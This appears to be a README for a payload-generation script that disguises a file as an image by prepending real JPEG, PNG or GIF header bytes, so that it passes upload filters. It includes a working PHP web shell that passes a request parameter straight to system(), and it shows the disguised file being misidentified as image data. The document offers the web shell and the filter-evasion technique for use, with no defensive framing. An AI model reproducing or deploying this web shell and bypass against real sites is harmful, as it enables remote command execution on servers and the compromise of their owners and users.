# Scripts for payload generation

## disguiseAsImage

This script is designed to disguise a payload as an image. It does this by adding the first 20 bytes of a real image to the beginning of the file and adding a file extension. This will fool most filters that, for example, might only allow images to be uploaded.

To use it, you will need to have a payload ready to use. It could be anything, here is a simple php script named payload.php

```php
<?php
if( isset( $_REQUEST['jh'] ) ):
	system( $_REQUEST['jh'] );
endif;
```

If I run `disguiseAsImage payload.php`, the script will create a file called `payload.php.jpg`.

```
.
├── payload.php
└── payload.php.jpg
```

After running `file` on both, you will see that it incorrectly identifies the second as an image.

```sh
file payload.php*
payload.php:     PHP script, ASCII text
payload.php.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16
```

The script will, by default, generate a jpg although you can specify png or gif by adding a second argument, e.g.

```
disguiseAsImage payload.php png
```
